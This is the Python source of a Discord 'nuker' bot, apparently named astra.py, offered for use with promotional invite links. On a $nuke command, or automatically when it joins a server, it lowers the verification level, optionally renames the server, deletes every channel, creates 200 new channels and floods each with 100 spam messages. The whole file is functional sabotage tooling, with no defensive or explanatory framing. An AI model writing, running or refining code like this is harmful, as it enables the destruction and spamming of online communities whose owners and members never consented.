import json
import asyncio
import time
import discord
import string
import random
import os
from discord.ext import commands
import ctypes
from pystyle import Colors, Center, Colorate, Write

with open("config.json", "r") as f:
    config_data = json.load(f)

nuke_on_join = config_data.get("nuke_on_join")
rename_guild = config_data.get("rename_guild")
channel_names = config_data.get("channel_names")
text = config_data.get("text")
token = config_data.get("token")

intents = discord.Intents.all()

astrapy = commands.Bot(command_prefix="$", intents=intents)
astrapy.remove_command('help')

def generate_random_string(length=10):
    ascii = 'ءآأؤإئابةتثجحخدذرزسشصضطظعغفقكلمنهوي'
    return ''.join(random.choice(ascii) for i in range(length))

def set_console_title(title):
    ctypes.windll.kernel32.SetConsoleTitleW(title)

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

async def delete_channels(guild):
    print("[-] Service Started: Deleting Channels.", Colors.blue)
    await asyncio.gather(*[channel.delete() for channel in guild.channels])

async def create_channels(guild, num_channels):
    print("[+] Service Started: Creating Channels.", Colors.blue)
    await asyncio.gather(*[guild.create_text_channel(name=generate_random_string()) for _ in range(num_channels)])

async def send_messages(channel, num_messages):
    print("[+] Service Started: Spamming Messages.", Colors.blue)
    for _ in range(num_messages):
        try:
            await channel.send(text)
        except discord.errors.HTTPException as e:
            if e.status == 429:
                print(f"[!] Service Error: Rate limited!", Colors.red)
            else:
                print(f"[!] Service Error: Error sending message: {e}", Colors.red)

@astrapy.event
async def on_ready():
    clear_console()
    set_console_title("astra.py ~ Nuker.py")

    banner = Center.XCenter("""
    _______       _____                   _____   __      ______              
    ___    |________  /_____________ _    ___  | / /___  ____  /______________
    __  /| |_  ___/  __/_  ___/  __ `/    __   |/ /_  / / /_  //_/  _ \_  ___/
    _  ___ |(__  )/ /_ _  /   / /_/ /     _  /|  / / /_/ /_  ,<  /  __/  /    
    /_/  |_/____/ \__/ /_/    \__,_/      /_/ |_/  \__,_/ /_/|_| \___//_/     
                                                                          
                Made By astra.py | Discord discord.gg/A5XW5RwMM4
                      Invite the bot or use $nuke to start\n      
    """)
    print(Colorate.Vertical(Colors.red_to_purple, banner, 2))

@astrapy.event
async def on_guild_channel_create(channel):
    global messages_sent, created_count
    created_count = len(channel.guild.channels)
    await send_messages(channel, 100)

@astrapy.command()
async def nuke(ctx):

    print(f"[/] Nuke activated ~ Preparing for the attack.", Colors.red)

    global messages_sent, created_count
    await ctx.message.delete()

    try:
        messages_sent = 0
        created_count = 0

        if rename_guild.lower() == "y":
            guild_name = generate_random_string()
            await ctx.guild.edit(name=guild_name, verification_level=discord.VerificationLevel.none)
            print(f"[+] Service Started: Renaming Guild To: {guild_name}", Colors.blue)
        else:
            await ctx.guild.edit(verification_level=discord.VerificationLevel.none)
    except Exception as e:
        print(f"[!] Service Error: Error editing guild: {e}", Colors.red)

    if discord.VerificationLevel.none:
        print(f"[+] Service Started: Edited Verification Level\n", Colors.blue)

    await delete_channels(ctx.guild)
    await create_channels(ctx.guild, 200)

@astrapy.event
async def on_guild_join(guild):
    if nuke_on_join.lower() == "true":
        try:
            if rename_guild.lower() == "y":
                guild_name = generate_random_string()
                await guild.edit(name=guild_name, verification_level=discord.VerificationLevel.none)
                print(f"[+] Service Started: Renaming Guild To: {guild_name}", Colors.blue)
            else:
                await guild.edit(verification_level=discord.VerificationLevel.none)

            if discord.VerificationLevel.none:
                print(f"=[+] Service Started: Edited Verification Level\n", Colors.red)

            await delete_channels(guild)
            await create_channels(guild, 200)
        except Exception as e:
            print(f"=[!] Service Error: Error editing guild: {e}", Colors.red)

astrapy.run(token)

# Any suggestion, join the discord an create an /suggestion: https://discord.gg/baMAyb4jeG